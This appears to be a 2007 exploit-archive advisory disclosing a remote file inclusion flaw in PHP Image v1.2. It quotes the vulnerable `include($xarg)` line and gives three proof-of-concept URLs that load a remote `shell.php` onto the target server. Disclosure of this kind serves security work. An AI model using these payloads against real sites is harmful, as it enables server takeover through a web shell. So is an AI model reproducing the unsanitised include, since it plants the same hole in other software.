@@ -1,0 +1,22 @@
+PHP Image v1.2 Multiple Remote File Inclusion
+
+Download: http://www.phpimage.co.uk/phpimage_v_1_2.zip
+
+Bug found by Civi
+
+Vuln code in xarg_corner.php, xarg_corner_bottom.php, xarg_corner_top.php:
+
+<td style="background-image: url(images/cor_top_fill.jpg);"><?php include($xarg); ?></td>
+
+POC:
+
+http://site/xarg_corner.php?xarg=http://shell.php?
+http://site/xarg_corner_bottom.php?xarg=http://shell.php ?
+http://site/xarg_corner_top.php?xarg=http://shell.php?
+
+
+[Original Post: forum.darkc0de.com]
+
+Tnx to: d3hydr8, str0ke
+
+# milw0rm.com [2007-10-23]
